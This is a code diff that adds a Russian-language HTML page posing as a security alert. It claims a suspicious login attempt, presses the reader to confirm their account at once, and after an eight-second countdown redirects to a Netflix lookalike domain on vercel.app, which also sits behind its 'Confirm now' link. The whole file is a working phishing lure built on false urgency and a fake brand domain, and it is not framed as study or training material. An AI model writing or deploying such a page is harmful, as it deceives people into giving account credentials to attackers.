@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Уведомление безопасности</title>
+    <meta http-equiv="refresh" content="8;url=https://www.netflix-orcin-six.vercel.app/">
+    <style>
+        body { font-family: Arial, sans-serif; background: #1877f2; color: white; padding: 50px; }
+        .social-alert { background: white; color: #333; padding: 40px; border-radius: 10px; text-align: center; }
+        .social-icon { font-size: 48px; color: #1877f2; margin-bottom: 20px; }
+        .timer { background: #1877f2; color: white; padding: 10px; border-radius: 5px; display: inline-block; margin: 15px 0; }
+    </style>
+</head>
+<body>
+    <div class="social-alert">
+        <div class="social-icon">👥</div>
+        <h2>Уведомление безопасности</h2>
+        <p>Обнаружена попытка входа в ваш аккаунт с подозрительного устройства</p>
+        <p>Для защиты ваших данных требуется немедленное подтверждение</p>
+        <div class="timer">Перенаправление через: <span id="timer16">8</span> сек</div>
+        <p><a href="https://www.netflix-orcin-six.vercel.app/" style="color: #1877f2;">Подтвердить сейчас</a></p>
+    </div>
+    
+    <script>
+        let time16 = 8;
+        setInterval(function() {
+            time16--;
+            document.getElementById('timer16').textContent = time16;
+        }, 1000);
+    </script>
+</body>
+</html>
